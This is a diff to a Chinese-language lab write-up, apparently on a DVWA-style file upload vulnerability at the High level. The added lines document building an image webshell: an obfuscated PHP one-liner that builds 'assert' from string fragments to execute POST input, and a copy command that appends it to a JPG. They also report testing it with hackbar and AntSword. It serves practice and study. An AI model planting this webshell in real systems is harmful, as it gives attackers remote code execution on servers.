@@ -1118,9 +1118,21 @@ High等级将上传文件的文件后缀取出来，判断最后一个`.`后面�
 
 之后bp时间后发现没有实现，查资料发现是php<5.3.4才可能存在此漏洞。
 
-之后又尝试了图片马，结合文件包含漏洞进行测试，可上传成功，但是访问时因为图片内容部分报错，未能利用成功，还是菜，之后成功再补。报错内容如下：
+之后又尝试了图片马，结合文件包含漏洞进行测试，可上传成功，但是访问时报错，是语法问题，和引号有关。报错内容如下：
 
 <img src="https://superj.oss-cn-beijing.aliyuncs.com/20200528174332.png" style="zoom:50%;" />
+
+```php
+<?php $a1='ass';$a2='ert';$arr=array($a1.$a2=>"test");$arr1=array_flip($arr);$arr2="$arr1[test]";@$arr2($_POST[shell]); ?>
+```
+
+```shell
+copy 1.jpg/b+shell.php/a 3.jpg
+```
+
+通过hackbar访问，成功，但是通过蚁剑连接的时候出现问题，返回为空。
+
+![](https://superj.oss-cn-beijing.aliyuncs.com/20200530103712.png)
 
 ## Impossible
 
